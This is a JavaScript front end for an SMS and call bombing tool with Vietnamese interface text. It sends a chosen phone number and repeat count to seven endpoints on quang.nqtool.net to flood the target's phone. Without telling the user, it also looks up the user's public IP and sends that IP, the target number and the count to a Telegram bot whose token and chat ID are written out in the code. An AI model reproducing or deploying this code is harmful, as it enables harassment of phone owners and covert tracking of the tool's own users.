let queue = [];
let processing = false;

// Bản quyền của quang
const urls = [
    'https://quang.nqtool.net/?',
    'https://quang.nqtool.net/index1.php?',
    'https://quang.nqtool.net/index2.php?',
    'https://quang.nqtool.net/index3.php?',
    'https://quang.nqtool.net/index4.php?',
    'https://quang.nqtool.net/index5.php?',
    'https://quang.nqtool.net/index6.php?'
];

function addToQueue() {
    const phone = document.getElementById('phone').value;
    const times = document.getElementById('times').value;

    if (phone && times) {
        queue.push({ phone, times });
        updateStatusBar();
        if (!processing) {
            processQueue();
        }
    }
}

function processQueue() {
    if (queue.length === 0) {
        processing = false;
        return;
    }

    processing = true;
    const { phone, times } = queue.shift();

    const listItem = document.createElement('li');
    listItem.innerText = `Bắt Đầu ${phone} (${times} times)`;
    document.getElementById('status-list').appendChild(listItem);

    // Fetch IP address before proceeding with the spam
    fetch('https://api64.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            const ip = data.ip;
            spamSmsAndCall(phone, times, ip, listItem);
        })
        .catch(error => {
            console.error('Error fetching IP:', error);
            spamSmsAndCall(phone, times, 'Unknown IP', listItem); // Fallback if IP fetch fails
        });
}

function spamSmsAndCall(phone, times, ip, listItem) {
    // Create URLs for API requests
    const urlsToFetch = urls.map(url => `${url}phone=${phone}&amout=${times}`);

    Promise.all(urlsToFetch.map((url, index) => 
        fetch(url)
            .then(response => response.json())
            .then(response => {
                // Extract endpoint (e.g., 'index1.php')
                const endpoint = new URL(url).pathname.split('/').pop();
                
                // Log the details (IP, phone, times, endpoint) and send to Telegram
                sendNotification(ip, phone, times, endpoint);

                return `URL${index + 1} - ${response.message}`;
            })
            .catch(error => {
                console.error('Error:', error);
                return `URL${index + 1} - Failed`;
            })
    ))
    .then(messages => {
        listItem.innerText = `Thành Công ${phone}: ${messages.join(', ')}`;
        processQueue();
    })
    .catch(error => {
        listItem.innerText = `Thành Công ${phone}`;
        processQueue();
    });
}

function sendNotification(ip, phone, times, endpoint) {
    const botToken = '7078009829:AAFvbF1hGtzdeLM8egbrmJDK0kpePgBPwOQ';  // Replace with your bot's token
    const chatId = '-1002136414572';  // Replace with your chat ID or group's chat ID

    const message = `Notification: 
    - IP: ${ip}
    - Phone: ${phone}
    - Times: ${times}
    - Endpoint: ${endpoint}`;

    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

    // Send the notification to Telegram
    fetch(url)
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                console.log('Notification sent to Telegram successfully.');
            } else {
                console.error('Failed to send notification:', data);
            }
        })
        .catch(error => {
            console.error('Error sending notification:', error);
        });
}

function updateStatusBar() {
    const statusList = document.getElementById('status-list');
    statusList.innerHTML = ''; // Clear the list
    queue.forEach((item, index) => {
        const listItem = document.createElement('li');
        listItem.innerText = `Luồng: ${item.phone} (${item.times} times)`;
        statusList.appendChild(listItem);
    });
}
